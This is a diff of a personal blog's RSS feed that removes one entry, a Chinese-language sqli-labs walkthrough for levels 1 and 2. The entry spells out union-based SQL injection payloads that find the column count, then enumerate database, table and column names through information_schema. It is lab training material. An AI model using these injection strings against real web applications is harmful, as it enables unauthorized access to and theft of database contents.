@@ -158,29 +158,6 @@ route add default gw 10.7.150.1再使用route命令验证一下，确认配好�
     </item>
     
     <item>
-      <title>sqli-labs</title>
-      <link>https://oopsdc.tk/post/sqli-labs/</link>
-      <pubDate>Sat, 10 Jul 2021 00:00:00 +0800</pubDate>
-      
-      <guid>https://oopsdc.tk/post/sqli-labs/</guid>
-      <description>Less-1 传入id=1，页面正常回显，传入id=1&#39;页面报错。分别传参id=1&#39; and 1=1和id=1&#39; and 1=2，页面回显正常，判断为字符型注入。
-接下来使用联合查询看看有几列数据:id=-1&#39;union select 1,2,3--+，这是两条语句，先让前面为-1为假，执行后面的联合查询语句，测试有几列数据，测试出来有3列数据，其中第2、3位为显示位，可进行联合查询注入。
-查看当前数据库名:id=-1&#39;union select 1,database(),3--+
-爆库名:id=-1&#39;union select 1,database(),group_concat(schema_name) from information_schema.schemata--+
-爆表名:id=-1&#39;union select 1,database(),group_concat(table_name) from information_schema.tables where table_name=database()--+
-爆字段:id=-1&#39;union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=database()--+
-Less-2 传入id=1 and 1=1页面正常，id=1 and 1=2页面无回显，判断为数字型注入。
-使用id=-1 order by语句测试有几列数据，当id=-1 order by 4时页面报错，所以有3列数据。
-使用联合查询语句id=-1 union select 1,2,3判断是否有回显位，2、3为回显位。
-查看当前数据库名:id=-1 union select 1,database(),3
-爆库名:id=-1 union select 1,database(),group_concat(schema_name) from information_schema.schemata
-后续操作跟前一关一样。
- 本文链接:sqli-labs | Atmet (oopsdc.tk)
-文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
- </description>
-    </item>
-    
-    <item>
       <title>ProxyChains</title>
       <link>https://oopsdc.tk/post/proxychains/</link>
       <pubDate>Fri, 09 Jul 2021 22:24:59 +0800</pubDate>
